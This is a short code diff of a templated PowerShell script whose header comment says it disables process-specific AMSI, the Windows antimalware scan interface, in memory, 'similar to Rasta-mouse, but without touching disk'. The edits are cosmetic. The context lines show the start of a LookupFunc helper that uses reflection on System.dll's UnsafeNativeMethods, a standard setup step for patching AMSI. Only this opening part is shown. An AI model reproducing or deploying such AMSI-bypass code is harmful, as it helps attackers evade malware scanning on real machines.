@@ -1,10 +1,9 @@
 {#
-Disable the process-specific AMSI
+Disable the process-specific AMSI.
 Similar to Rasta-mouse, but without touching disk.
 #}
 
 function LookupFunc {
-
     Param ($moduleName, $functionName)
     $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
     $tmp = @()
